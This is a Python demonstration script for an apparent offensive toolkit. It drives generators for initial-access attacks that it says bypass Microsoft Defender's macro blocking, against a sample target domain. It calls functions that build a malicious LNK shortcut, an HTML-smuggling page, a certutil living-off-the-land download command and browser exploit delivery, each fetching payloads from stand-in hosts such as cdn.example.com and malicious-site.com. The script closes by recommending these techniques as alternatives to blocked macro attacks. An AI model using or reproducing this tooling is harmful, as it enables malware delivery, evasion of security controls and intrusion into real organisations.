#!/usr/bin/env python3
"""
Demonstration script for non-blocked initial access techniques.

This script shows how to use the new non-blocked initial access techniques
that bypass Microsoft Defender's macro blocking (as of 2022).
"""

import sys
import os

# Add the project root to Python path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from apt_toolkit.initial_access_non_blocked import (
    NonBlockedInitialAccess,
    LNKFileAttack,
    HTMLSmuggling,
    LivingOffTheLand,
    BrowserExploitDelivery
)


def demo_non_blocked_techniques():
    """Demonstrate non-blocked initial access techniques."""
    
    print("=" * 70)
    print("NON-BLOCKED INITIAL ACCESS TECHNIQUES DEMO")
    print("Bypasses Microsoft Defender Macro Blocking (2022)")
    print("=" * 70)
    
    # Initialize the main class
    non_blocked = NonBlockedInitialAccess()
    
    # Show available techniques
    print("\n1. AVAILABLE NON-BLOCKED TECHNIQUES:")
    print("-" * 40)
    techniques = non_blocked.get_available_techniques()
    for i, technique in enumerate(techniques, 1):
        print(f"{i}. {technique['name']}")
        print(f"   Description: {technique['description']}")
        print(f"   Evasion Level: {technique['evasion_level']}")
        print(f"   Success Rate: {technique['success_rate']}")
        print(f"   User Interaction: {technique['user_interaction']}\n")
    
    # Generate attack plan
    print("\n2. SAMPLE ATTACK PLAN:")
    print("-" * 40)
    attack_plan = non_blocked.generate_attack_plan("target-company.com")
    print(f"Target Domain: {attack_plan['target_domain']}")
    print(f"Rationale: {attack_plan['rationale']}")
    print(f"Estimated Success Rate: {attack_plan['estimated_success_rate']}")
    print(f"Detection Difficulty: {attack_plan['detection_difficulty']}")
    print(f"Recommended Approach: {attack_plan['recommended_approach']}")
    print("\nSelected Techniques:")
    for i, technique in enumerate(attack_plan['attack_techniques'], 1):
        print(f"  {i}. {technique['name']}")
    
    # Demonstrate individual techniques
    print("\n3. INDIVIDUAL TECHNIQUE DEMONSTRATIONS:")
    print("-" * 40)
    
    # LNK File Attack
    print("\n• LNK File Attack:")
    lnk_attack = LNKFileAttack()
    lnk_result = lnk_attack.create_malicious_lnk("http://cdn.example.com/payload.ps1", "document")
    print(f"  File: {lnk_result['file_name']}")
    print(f"  Target: {lnk_result['target_path']}")
    print(f"  Arguments: {lnk_result['arguments'][:50]}...")
    print(f"  Evasion: {lnk_result['detection_evasion']}")
    
    # HTML Smuggling
    print("\n• HTML Smuggling:")
    html_smuggling = HTMLSmuggling()
    html_result = html_smuggling.create_smuggling_html("http://cdn.example.com/payload.exe", "security")
    print(f"  Template: {html_result['template_type']}")
    print(f"  File: {html_result['html_file']}")
    print(f"  Technique: {html_result['technique']}")
    print(f"  Evasion: {html_result['evasion_level']}")
    
    # Living-off-the-Land
    print("\n• Living-off-the-Land (LOTL):")
    lotl = LivingOffTheLand()
    lotl_result = lotl.generate_lotl_command("http://cdn.example.com/payload.exe", "certutil")
    print(f"  Tool: {lotl_result['tool']}")
    print(f"  Description: {lotl_result['description']}")
    print(f"  Command: {lotl_result['command'][:60]}...")
    print(f"  Evasion: {lotl_result['evasion_level']}")
    
    # Browser Exploit
    print("\n• Browser Exploit Delivery:")
    browser_exploit = BrowserExploitDelivery()
    browser_result = browser_exploit.generate_browser_exploit("Chrome", "http://malicious-site.com/exploit.html")
    print(f"  Browser: {browser_result['target_browser']}")
    print(f"  Technique: {browser_result['exploit_technique']}")
    print(f"  CVE: {browser_result['cve_reference']}")
    print(f"  Framework: {browser_result['framework']}")
    
    print("\n" + "=" * 70)
    print("DEMONSTRATION COMPLETE")
    print("These techniques provide effective alternatives to macro-based attacks")
    print("that are blocked by modern security controls.")
    print("=" * 70)


if __name__ == "__main__":
    demo_non_blocked_techniques()